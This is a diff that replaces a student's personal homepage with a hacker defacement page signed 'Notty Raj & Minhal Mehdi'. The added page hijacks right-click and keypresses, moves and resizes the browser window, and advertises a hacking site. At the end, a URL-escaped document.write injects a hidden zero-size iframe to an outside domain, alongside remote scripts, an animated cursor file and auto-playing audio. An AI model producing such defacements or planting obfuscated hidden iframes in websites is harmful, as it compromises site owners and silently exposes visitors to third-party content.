@@ -1,115 +1,686 @@
-<!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html>
 <head>
-<title>Welcome to Anuraag's Page</title>
-<meta charset="iso-8859-1">
-<link rel="stylesheet" href="styles/layout.css" type="text/css">
-<!--[if lt IE 9]><script src="scripts/html5shiv.js"></script><![endif]-->
+<style type="text/css">
+HTML,BODY{cursor: url("http://downloads.totallyfreecursors.com/cursor_files/indonesia.ani"), url("http://i55.tinypic.com/2z7ld11.gif"), auto;}
+</style>
+<meta http-equiv="content-type" content="text/html; charset=UTF-16">
+<meta name="verify-v1" content="WqT6kZySLLYe/gRjkWf1sNcr+RrPRuowoZD31PZAV+Q=" />
+<title> || Power Hackers || </title>
+<link rel="SHORTCUT ICON" href="http://i55.tinypic.com/2z7ld11.gif">
+ 
+<center>
+ 
+<img src="http://i55.tinypic.com/14uuv14.png" border="0" width="500" height="400" />
+ 
+ 
+ 
+ 
+<script>
+var message="                         ___       ____       ____\n             ______/      \\__//      \\__/_____\\\n          _/      \\_/     :                     //_____\\\\\n         /|           :       :     ..           /              \\\n         ||          ::             ::           \\              /\n         ||          :|             ||            \\  \_____/\n         ||          ||              ||            |\\     /   |\n         \\|          ||              ||            |      / |  \\\n           |          ||              ||           |    / /_\\  \\\n           | ____ || ______ ||           |  /  /        \\\n            \\ _-_ / \\ _-_-_ / | ______ |/_/            \\\n                                    _\\_-_-_-_/    \\             /\n                                  /____                          /\n                                /          \\                       /\n                                \\______\\_________ /\n\n\n              INDIAN HACKERS  [-] -=[ Hacked By Notty Raj & Minhal Mehdi ]=- [-]";
+///////////////////////////////////
+function clickIE4(){if (event.button==2){alert(message);return false;}}
+function clickNS4(e){if (document.layers||document.getElementById&&!document.all){if (e.which==2||e.which==3){alert(message);return false;}}}
+if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS4;}
+else if (document.all&&!document.getElementById){document.onmousedown=clickIE4;}
+document.oncontextmenu=new Function("alert(message);return false")
+</script>
+<SCRIPT>
+window.scrollBy(0, 1)
+window.resizeTo(0,0)
+window.moveTo(0,0)
+//setInterval("move()",30);
+setTimeout("move()", 1);
+var mxm=50
+var mym=25
+var mx=0
+var my=0
+var sv=50
+var status=1
+var szx=0
+var szy=0
+var c=255
+var n=0
+var sm=30
+var cycle=2
+var done=2
+function move()
+{
+if (status == 1)
+{
+mxm=mxm/1.05
+mym=mym/1.05
+mx=mx+mxm
+my=my-mym
+mxm=mxm+(400-mx)/100
+mym=mym-(300-my)/100
+window.moveTo(mx,my)
+rmxm=Math.round(mxm/10)
+rmym=Math.round(mym/10)
+if (rmxm == 0)
+{
+if (rmym == 0)
+{
+status=2
+}
+}
+}
+if (status == 2)
+{
+sv=sv/1.1
+scrratio=1+1/3
+mx=mx-sv*scrratio/2
+my=my-sv/2
+szx=szx+sv*scrratio
+szy=szy+sv
+window.moveTo(mx,my)
+window.resizeTo(szx,szy)
+if (sv < 0.1)
+{
+status=3
+}
+}
+if (status == 3)
+{
+document.fgColor=0xffffFF
+c=c-16
+if (c<0)
+{status=8}
+}
+if (status == 4)
+{
+c=c+16
+document.bgColor=c*65536
+document.fgColor=(255-c)*65536
+if (c > 239)
+{status=5}
+}
+if (status == 5)
+{
+c=c-16
+document.bgColor=c*65536
+document.fgColor=(255-c)*65536
+if (c < 0)
+{
+status=6
+cycle=cycle-1
+if (cycle > 0)
+{
+if (done == 1)
+{status=7}
+else
+{status=4}
+}
+}
+}
+if (status == 6)
+{
+document.title = "Cljck"
+alert("Cljck")
+cycle=2
+status=4
+done=1
+}
+if (status == 7)
+{
+c=c+4
+document.bgColor=c*65536
+document.fgColor=(255-c)*65536
+if (c > 128)
+{status=8}
+}
+if (status == 8)
+{
+window.moveTo(0,0)
+sx=screen.availWidth
+sy=screen.availHeight
+window.resizeTo(sx,sy)
+status=9
+}
+var timer=setTimeout("move()",0.3)
+}
+</SCRIPT>
+ 
+ 
+ 
+<script language="javascript">
+function keypressed() {
+alert("Hacked By: -=[ Notty Raj & Minhal Mehdi ]=-");
+}
+document.onkeydown=keypressed;
+// End  -->
+</script>
+ 
+<script>
+TypingText = function(element, interval, cursor, finishedCallback) {
+  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+    this.running = true;        // Never run.
+    return;
+  }
+  this.element = element;
+  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+  this.interval = (typeof interval == "undefined" ? 100 : interval);
+  this.origText = this.element.innerHTML;
+  this.unparsedOrigText = this.origText;
+  this.cursor = (cursor ? cursor : "");
+  this.currentText = "";
+  this.currentChar = 0;
+  this.element.typingText = this;
+  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+  TypingText.all.push(this);
+  this.running = false;
+  this.inTag = false;
+  this.tagBuffer = "";
+  this.inHTMLEntity = false;
+  this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+  if(this.running) return;
+  if(typeof this.origText == "undefined") {
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);   // We haven't finished loading yet.  Have patience. http://www.lozere.maisons-paysannes.org/media/erne.swf
+    return;
+  }
+  if(this.currentText == "") this.element.innerHTML = "";
+//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
+  if(this.currentChar < this.origText.length) {
+    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+      this.tagBuffer = "<";
+      this.inTag = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+      this.tagBuffer += ">";
+      this.inTag = false;
+      this.currentText += this.tagBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inTag) {
+      this.tagBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+      this.HTMLEntityBuffer = "&";
+      this.inHTMLEntity = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+      this.HTMLEntityBuffer += ";";
+      this.inHTMLEntity = false;
+      this.currentText += this.HTMLEntityBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inHTMLEntity) {
+      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else {
+      this.currentText += this.origText.charAt(this.currentChar);
+    }
+    this.element.innerHTML = this.currentText;
+    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+    this.currentChar++;
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+  } else {
+        this.currentText = "";
+        this.currentChar = 0;
+        this.running = false;
+        this.finishedCallback();
+  }
+}
+</script>
+<style>
+body {
+        padding:0;
+        margin:0;
+        background-repeat: no-repeat;
+        background-position:tile;
+background-color: black;
+color: #000000;
+font: normal 100% Courier;
+margin-top: 0px;
+margin-left: 0px;
+padding: 0;
+margin-right: 0px;
+}
+</style>
 </head>
-<body>
-<embed src ="bgsc.mp3" autostart="true" height=0 loop="infinite">
-<div class="wrapper row1">
-  <header id="header" class="clear">
-    <div id="hgroup">
-      <h1>Anuraag Baishya</h1>
-      <h2><font size='4'>Engineering Student, Coder, Poet, Lyricist, Rapper,Philosopher, Blogger. Self Made Human Being.</font></h2>
-      <p>            </p>
-      <h2><font size='4'>My Other Pages:</font></h2>
-      </div>
-    <nav>
-      <ul>
-        <li><font color:"ff7a22"><a href="http://anuraagbaishya.worpress.com">Wordpress</a></font></li>
-        <li><a href="https://www.facebook.com/anuraagbaishyapoetry"><font color:"ff7a22">Facebook</font></a></li>
-        <li><a href="http://instagram.com/anuraagbaishya/"><font color:"ff7a22">Instagram</font></a></li>
-        <li><a href="https://twitter.com/apb_senior"><font color:"ff7a22">Twitter</font></a></li>
-      </ul>
-    </nav>
-  </header>
-</div>
-<!-- content -->
-<div class="wrapper row2">
-  <div id="container" class="clear">
-    <!-- Slider -->
-    <section id="slider" class="clear">
-      <figure><img src="images/demo/img1.jpg" alt="">
-        <figcaption>
-          <h2>About Myself</h2>
-          <p><font size='2'>I was born and brought up in the serene teagardens of assam. I passed my 10th class from the Assam Valley School scoring an aggregate of 96% (ICSE) and my 12th grade from D.P.S R.K.Puram with an aggregate of 96% (CBSE). Currently I'm doing B.Tech (IT) from MIT Manipal</font></p>
-         </figcaption>
-      </figure>
-    </section>
-    <!-- main content -->
-    <div id="intro">
-      <section class="clear">
-        <!-- article 1 -->
-        <article class="two_quarter">
-          <h2>My Skills</h2>
-          <p><b>C++</b></p>
-          <p><b>Java</b></p>
-          <p><b>CSS3</b></p>
-          <p><b>HTML5</b></p>
-          <p><b>Python</b></p>
-          <p><b>Android</b></p>
-          <p><b>Photoshop</b></p>
-          <h2>Contact</h2>
-          <p><font color:"ff7a22"><b>email:</b></font> baishya.anuraag1920@gmail.com</p>
-          <p><font color:"ff7a22"><b>alternate:</b></font> anuraagbaishya.hotmail.com</p>
-        </article>
-        <!-- article 2 -->
-        <article class="two_quarter lastbox">
-          <figure>
-            <ul class="clear">
-              <li><img src="images/demo/130x130.jpg" width="130" height="130" alt=""></li>
-              <li><img src="images/demo/img3.jpg" width="130" height="130" alt=""></li>
-              <li class="last"><img src="images/demo/img4.jpg" width="130" height="130" alt=""></li>
-            </ul>
-            <figcaption>Just filling the page</figcaption>
-          </figure>
-        </article>
-      </section>
-    </div>
-    <!-- ########################################################################################## -->
-    <!-- ########################################################################################## -->
-    <!-- ########################################################################################## -->
-    <!-- ########################################################################################## -->
-    <div id="homepage" class="last clear">
-      <section class="one_quarter">
-        <h2 class="title">Hobbies</h2>
-        <article>
-          <p>Coding</p>
-          <p>Writing</p>
-          <p>Photography</p>
-          <p>Gaming</p>
-          <p>Reading</p>
-        </article>
-      </section>
-      <section class="one_quarter">
-        <h2 class="title">Quick Links</h2>
-        <nav>
-          <ul>
-            <li><a href="http://www.google.com">Google</a></li>
-            <li><a href="http://www.facebook.com">Facebook</a></li>
-            <li><a href="http://www.twitter.com">Twitter</a></li>
-            <li><a href="http://www.youtube.com">YouTube</a></li>
-            <li class="last"><a href="http://www.github.com">GitHub</a></li>
-          </ul>
-        </nav>
-      </section>
-      <section class="two_quarter lastbox">
-        <h2 class="title">Mom and Dad</h2>
-        <img class="imgl" src="images/demo/img5.jpg" width="130" height="130" alt="">
-        <p>My Mom and Dad. All I am today is because of them. They are the most wonderful parents in the world. Thank You for always being there by my side, helping me, guiding me and giving me the best advice.</p>
-      </section>
-    </div>
-    <!-- / content body -->
-  </div>
-</div>
-<!-- Footer -->
-<div class="wrapper row3">
-  <footer id="footer" class="clear">
-    <p class="fl_left">Copyright &copy; 2015 - All Rights Reserved - <a href="http:anuraagbaishya.github.io">Anuraag Baishya</a></p>
-    <p class="fl_right">Template by <a href="http://www.os-templates.com/" title="Free Website Templates">OS Templates</a></p>
-  </footer>
-</div>
+<body bgcolor="black">
+<!-- --><script type="text/javascript">if(typeof(urchinTracker)=='function'){_uacct="UA-230305-2";_udn="none";_uff=false;urchinTracker();}</script> <script type="text/javascript" src="http://edge.quantserve.com/quant.js"></script> <script type="text/javascript">_qacct="p-44naSaXtNJt26";quantserve();</script> </body></noframes><body bgcolor="#000000"><center>
+ 
+ 
+ 
+ 
+<h1><center><font face="abadon" size="24<center><noscript></noscript><!-- --><script type="text/javascript" src="http://www.freewebs.com/p.js"></script><script>
+farbbibliothek = new Array();
+farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100");
+farbbibliothek[1] = new Array("#00FF00","#000000","#00FF00","#00FF00");
+farbbibliothek[2] = new Array("#00FF00","#FF0000","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00");
+farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");
+farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");
+farbbibliothek[5] = new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF");
+farbbibliothek[6] = new Array("#0000FF","#FFFF00");
+farben = farbbibliothek[4];
+function farbschrift()
+{
+for(var i=0 ; i<Buchstabe.length; i++)
+{
+document.all["a"+i].style.color=farben[i];
+}
+farbverlauf();
+}
+function string2array(text)
+{
+Buchstabe = new Array();
+while(farben.length<text.length)
+{
+farben = farben.concat(farben);
+}
+k=0;
+while(k<=text.length)
+{
+Buchstabe[k] = text.charAt(k);
+k++;
+}
+}
+function divserzeugen()
+{
+for(var i=0 ; i<Buchstabe.length; i++)
+{
+document.write("<span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span>");
+}
+farbschrift();
+}
+var a=1;
+function farbverlauf()
+{
+for(var i=0 ; i<farben.length; i++)
+{
+farben[i-1]=farben[i];
+}
+farben[farben.length-1]=farben[-1];
+ 
+setTimeout("farbschrift()",30);
+}
+// Zu Demonstrationszwecken*****************
+var farbsatz=1;
+function farbtauscher()
+{
+farben = farbbibliothek[farbsatz];
+while(farben.length<text.length)
+{
+farben = farben.concat(farben);
+}
+farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001));
+}
+setInterval("farbtauscher()",4500);
+text= " hAckeD bY Minhal Mehdi & Notty Raj ";
+//h
+string2array(text);
+divserzeugen();
+//document.write(text);  
+//
+/*function expand() {
+for(x = 0; x < 50; x++) {
+window.moveTo(screen.availWidth * -(x - 50) / 100, screen.availHeight * -(x - 50) / 100);
+window.resizeTo(screen.availWidth * x / 50, screen.availHeight * x / 50);
+}
+window.moveTo(0,0);
+window.resizeTo(screen.availWidth, screen.availHeight);
+}
+expand();*/
+</script></font></h1><br>
+<img src="http://i749.photobucket.com/albums/xx135/febry17sulis/hyzt3r14.gif" alt="" border="0">
+<h2><font face='Courier'><center> <FONT color=#FF0000>---==[+| Power Hackers |+]==--- </center></h2>
+<div id="example1"> <FONT color=#FF0000> Today's Update : Website Has Been Hacked By Notty Raj & Minhal Mehdi^ </div>
+<img src="http://i749.photobucket.com/albums/xx135/febry17sulis/hyzt3r14.gif" alt="" border="0">
+<h2><font face='Courier'><center> <FONT color=#FF0000> ---==[+| INDIAN HACKERS |+]==--- </center></h2>
+<div id="example3"> <FONT color=#FFFF00> ^ Live For INDIA or Leave INDIA ^ </div>
+ 
+ 
+<STYLE type=text/css>.matrix {
+PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 10pt; PADDING-BOTTOM: 0px; MARGIN: 0px; WIDTH: 10px; PADDING-TOP: 0px; FONT-FAMILY: Lucida Console, Courier, Monotype; TEXT-ALIGN: center
+}
+</STYLE>
+<a href="http://devilscafe.co.cc" title="weLcome To Hacking world"><img src="http://i749.photobucket.com/albums/xx135/febry17sulis/hyzt3r14.gif" alt="" border="0"></a><br><a href="http://devilscafe.co.cc" title="weLcoMe"></a>
+<P></P>
+<SCRIPT language=JavaScript>
+msg = new Array(); //strings written in screen
+msg[0] = "<h2><font face='Courier'><center> ---==[+|<FONT color=#00FF00> |+]==---</center></h2>";
+msg[1] = "<b> </font> <font face='Courier' color='#00FF00'></font>";
+msg[2] = "<font face='Courier' color='#00FF00'>Power Hackers</font>";
+msg[3] = "<font face='Courier' color='#00FF00'> <{+=================+}>";
+msg[4] = "<font face='Courier' color='#00FF00'><~~~~~~~~~~~~~~~</font>";
+text1 = ""; //the same as text2, only the last character is highlighted
+text2 = ""; //current string, which will be written
+count = 0; //char index in string text
+count2 = 0; //number of strings
+text = msg[0].split(""); //text - string written
+function writetext() { //show strings above on screen
+text1 = text2 + "<font color='#00FF00'>" + text[count] + "</font>";
+text2 += text[count];
+document.all["nothing"].innerHTML = text1; //where to write
+ 
+if (count < text.length-1){
+count++;
+setTimeout('writetext()', 25);
+}
+else { //if this string is written, get the new string
+count = 0;
+if (count2 != 4) { //write 4 strings
+count2++;
+text2 += "<p>"; //a new line
+text = eval('msg['+count2+'].split("")'); //get the new string to text
+setTimeout('writetext()', 25);
+}
+}
+}
+</SCRIPT>
+<h2><font face='Courier'><center> <FONT color=#FF0000>---==[+| For ADMIN |+]==---</center></h2>
+<p id="example2"> <FONT color=#00FF00> ==> BuT, This'z just WARNING For You,, So you know that Your SECURITY is sTiLL LACKING and there are many HOLES in your SYSTEM.... , Don'T WORRY,, Your Database is SAFE ==> So, Please Patch Your System . . . and Thnk'z  . . .</p>
+<img src="http://i749.photobucket.com/albums/xx135/febry17sulis/hyzt3r14.gif" alt="" border="0">
+<h2><font face='Courier'><center> <FONT color=#FF0000>---==[+| Hacked By Notty Raj & Minhal Mehdi |+]==--- </center></h2>
+ 
+<font face='Segoe Print' color='#FFFF00'><marquee>    </font></marquee>
+<h2><font face='Courier'><center> <FONT color=#FF0000>---==[+| follow this web site  |+]==---</center></h2>
+<blink><b><font size="11" face="Segoe Print" color="lime"> ---=[+|   Devilscafe.co.cc    |+]==---</font></b> </blink>
+ 
+ 
+ 
+ 
+ 
+<img src="http://i749.photobucket.com/albums/xx135/febry17sulis/hyzt3r14.gif" alt="" border="0">
+ 
+        <script type="text/javascript">
+//Define first typing example:
+new TypingText(document.getElementById("example1"), 250, function(i){
+var ar = new Array("===>>","===>>","===>>","===>>"); return " " + ar[i.length %
+ar.length]; });
+//Define second typing example (use "slashing" cursor at the end):
+new TypingText(document.getElementById("example2"), 250, function(i){
+var ar = new Array("\\","|","/","-"); return " " + ar[i.length %
+ar.length]; });
+//Define second typing example (use "slashing" cursor at the end):
+new TypingText(document.getElementById("example3"), 250, function(i){
+var ar = new Array("\\","|","/","-"); return " " + ar[i.length %
+ar.length]; });
+//Type out examples:
+TypingText.runAll();
+ 
+</script>
+ 
+<p align="center">
+</p>
+<script type="text/javascript">
+      // ------------------------------------------------------------------------------------
+      //  Matrix Code By BaghazzHck23
+      // ------------------------------------------------------------------------------------
+      var theinHTML;
+      var thelessstr;
+      var ascSt=22;
+      var ascEnd=126;
+      var numoflines = 28;
+      var lines = new Array();
+      var intervalID = new Array();
+      var subIntervalID = new Array();
+      var subIntervalID2 = new Array();
+      var scH = screen.height-220;
+      var scW = screen.width-50;
+      window.onload = createlines;
+      // -------------------------------------------------------------------------------------
+      // Convert decimal to hex (for the colour)
+      var hD="0123456789ABCDEF";
+      function d2h(d)
+      {
+         var h = hD.substr(d&15,1);
+         while(d > 15)
+         {
+            d >>= 4;
+            h = hD.substr(d&15,1)+h;
+         }
+         return h;
+      }
+      // -------------------------------------------------------------------------------------
+      // The line object      
+      function line(length, maxlength, chars, speed, x)
+      {
+         this.length = length;
+         this.maxlength = maxlength;
+         this.chars = chars;
+         this.speed = speed;
+         this.x = x;
+      }    
+      // -------------------------------------------------------------------------------------
+      // Creates the lines
+      function createlines()
+      {            
+      // create the lines as objects as defined above with length, characters, speed, x-value
+         for(var eachline = 0; eachline < numoflines; eachline++)
+         {
+            lines[eachline] = new line(0, Math.round(Math.random()*15+5), String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt)), Math.round(Math.random()*400+100), eachline*45);
+         }  
+         // write the lines  
+         for(var writelines = 0; writelines < numoflines; writelines++)
+         {
+            var newline = document.createElement("div");
+            newline.id = "char" + writelines;
+            newline.style.position = "absolute";
+            newline.style.top = "5px";
+            newline.style.left = lines[writelines].x + "px";        
+            var firstchar = document.createElement("div");
+            var newcolor = d2h(Math.round(1/(lines[writelines].maxlength+1)*255));
+            if(newcolor.length == 1)
+               newcolor = "0" + newcolor;
+            firstchar.style.color = "#00"+newcolor+"00"
+            firstchar.innerHTML = lines[writelines].chars
+            newline.appendChild(firstchar);          
+            document.body.appendChild(newline);
+         }
+         start();
+      }
+      // -------------------------------------------------------------------------------------
+      // Starts it moving & changing
+      function start()
+      {
+         for(var pickastring = 0; pickastring < numoflines; pickastring++)
+         {
+            intervalID[pickastring] = setInterval("addchars("+pickastring+")", lines[pickastring].speed);
+         }
+      }
+      // -------------------------------------------------------------------------------------
+      // Add random characters to the string (and a line break)
+      // and make sure the last one is light
+      // once it gets to maxlength start moving down
+      function addchars(theline)
+      {
+         if(lines[theline].length >= lines[theline].maxlength)
+         {
+            clearInterval(intervalID[theline]);
+            subIntervalID[theline] = setInterval("movethestring("+theline+")", lines[theline].speed);
+         }
+         else
+         {
+            // Get a char (not " or ' or \ or it'll get confused)
+            myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            while(myRandomChar == "'" || myRandomChar == '"' || myRandomChar == "\\")
+               myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            // Make a new div for it (so we can change it's colour)
+            var newchar = document.createElement("div");
+            newchar.innerHTML = myRandomChar;
+            document.getElementById("char"+theline).appendChild(newchar);
+            // Colour it
+            var i;
+            for(i = 0; i <= lines[theline].length; i++)
+            {
+               var newcolor = d2h(Math.round((i+1)/(lines[theline].maxlength+1)*255));
+               newcolor = "" + newcolor;
+               if(newcolor.length == 1)
+                  newcolor = "0" + newcolor;
+               document.getElementById("char"+theline).childNodes[i].style.color = "#00" + newcolor + "00";
+               document.getElementById("char"+theline).childNodes[i].style.fontWeight = "normal";
+            }
+            document.getElementById("char"+theline).childNodes[i].style.color = "#99FF99";
+            document.getElementById("char"+theline).childNodes[i].style.fontWeight = "bold";
+            // Increase length by one
+            lines[theline].length++;
+         }
+      }
+      // -------------------------------------------------------------------------------------
+      // Moves the string (creates and destroys chars)
+      function movethestring(theline)
+      {
+         var topstringnum = document.getElementById("char"+theline).offsetTop;
+         if((topstringnum + (lines[theline].maxlength * 15)) >= scH)
+         {
+            clearInterval(subIntervalID[theline]);
+            subIntervalID2[theline] = setInterval("clearletters("+theline+")", lines[theline].speed);
+         }
+         else
+         {
+            // create
+            myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            while(myRandomChar=="'" || myRandomChar=='"' || myRandomChar=="\\")
+               myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            var newchar = document.createElement("div");
+            newchar.innerHTML = myRandomChar;
+            document.getElementById("char"+theline).appendChild(newchar);
+            // delete
+            document.getElementById("char"+theline).removeChild(document.getElementById("char"+theline).childNodes[0]);
+            // re-colour
+            var i;
+            for(i = 0; i < lines[theline].length; i++)
+            {
+               var newcolor = d2h(Math.round((i+1)/(lines[theline].maxlength+1)*255));
+               newcolor = "" + newcolor;
+               if(newcolor.length == 1)
+                  newcolor = "0" + newcolor;
+               document.getElementById("char"+theline).childNodes[i].style.color = "#00" + newcolor + "00";
+               document.getElementById("char"+theline).childNodes[i].style.fontWeight = "normal";
+            }
+            document.getElementById("char"+theline).childNodes[i].style.color = "#99FF99";
+            document.getElementById("char"+theline).childNodes[i].style.fontWeight = "bold";
+            // move
+            document.getElementById("char"+theline).style.top = (topstringnum+15) + "px";
+         }
+      }
+      // -------------------------------------------------------------------------------------
+      // pretty much the opposite of addchars()
+      function clearletters(theline)
+      {
+         if(lines[theline].length <= -1)
+         {
+            clearInterval(subIntervalID2[theline]);
+            document.getElementById("char"+theline).style.top = 0;
+            intervalID[theline] = setInterval("addchars("+theline+")", lines[theline].speed);
+         }
+         else
+         {
+            // Remove the first character
+            document.getElementById("char"+theline).removeChild(document.getElementById("char"+theline).childNodes[document.getElementById("char"+theline).childNodes.length-1]);
+            // Move it down by 15px
+            var topstringnum = document.getElementById("char"+theline).offsetTop;
+            document.getElementById("char"+theline).style.top = topstringnum+15 + "px";
+            // Decrease length by one
+            lines[theline].length--;
+         }
+      }
+   </script>
+    <script type="text/javascript">
+<!--//
+function tb9_makeArray(n){
+        this.length = n;
+        return this.length;
+}
+tb9_messages = new tb9_makeArray(4);
+tb9_messages[0] = " <===== hacked By Notty Raj & Minhal Mehdi =====> ";
+tb9_messages[1] = "-=Power Hackers=-";
+tb9_messages[2] = "Indian Hackers Te4m";
+tb9_messages[3] = "Greetz To Notty Nikki, Team NUTS, IndiShell & W.O.H.";
+tb9_messages[4] = "<========== P0w3R H4CK3R ==========>";
+tb9_messages[5] = " <===== hacked By Minhal Mehdi & Notty Raj =====> ";
+tb9_rptType = 'infinite';
+tb9_rptNbr = 5;
+tb9_speed = 75;
+tb9_delay = 2000;
+var tb9_counter=1;
+var tb9_currMsg=0;
+var tb9_timerID = null
+var tb9_bannerRunning = false
+var tb9_state = ""
+tb9_clearState()
+function tb9_stopBanner() {    
+        if (tb9_bannerRunning)         
+        clearTimeout(tb9_timerID)      
+        tb9_timerRunning = false
+}
+function tb9_startBanner() {   
+        tb9_stopBanner()       
+        tb9_showBanner()
+}
+function tb9_clearState() {    
+        tb9_state = "" 
+        for (var i = 0; i < tb9_messages[tb9_currMsg].length; ++i) {           
+                tb9_state += "0"       
+        }
+}
+function tb9_showBanner() {    
+if (tb9_getString()) {         
+        tb9_currMsg++          
+        if (tb9_messages.length <= tb9_currMsg) {              
+                if ((tb9_rptType == 'finite') && (tb9_counter==tb9_rptNbr)){
+                        tb9_stopBanner();
+                        return;
+                }
+                tb9_counter++;
+                tb9_currMsg=0;
+        }
+        tb9_clearState()               
+        tb9_timerID = setTimeout("tb9_showBanner()", tb9_delay)
+}
+else {         
+        var tb9_str = ""               
+for (var j = 0; j < tb9_state.length; ++j) {                   
+        tb9_str += (tb9_state.charAt(j) == "1") ? tb9_messages[tb9_currMsg].charAt(j) : "___"          
+}              
+document.title = tb9_str               
+tb9_timerID = setTimeout("tb9_showBanner()", tb9_speed)
+}
+}
+function tb9_getString() {     
+        var full = true
+        for (var j = 0; j < tb9_state.length; ++j) {           
+                if (tb9_state.charAt(j) == 0)                  
+                        full = false   
+                }      
+        if (full) return true  
+        while (1) {            
+                var num = tb9_getRandom(tb9_messages[tb9_currMsg].length)              
+                if (tb9_state.charAt(num) == "0")                      
+                        break
+        }      
+        tb9_state = tb9_state.substring(0, num) + "1" + tb9_state.substring(num + 1, tb9_state.length) 
+        return false
+}
+function tb9_getRandom(max) {  
+        var now = new Date()           
+        var num = now.getTime() * now.getSeconds() * Math.random()     
+        return num % max
+}
+tb9_startBanner()
+</script>
 </body>
-</html>
+</html><script>
+<!--
+document.write(unescape("%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%3Ciframe%20frameborder%3D%220%22%20height%3D%220%22%20src%3D%22http%3A//www.devilscafe.in%22%20%0A%0Awidth%3D%220%22%3E%3C/iframe%3E%0A%3Ca%20href%3D%22http%3A//www.devilscafe.in%22%20target%3D%22_blank%22%3E%3Cimg%20%0A%0Asrc%3D%22%22%20/%3E%22%29%29%3B%0A//--%3E%0A%3C/script%3E"));
+//-->
+</script>
+<embed src="http://www60.indowebster.com/p5dt6tcxo655ta70qxc5b5f32ihnxmj7.mp3?d85351ae7c808037766e1605f72f8933" autostart="TRUE" loop="TRUE" repeat="TRUE" width="0" height="0" align="CENTER"></embed>
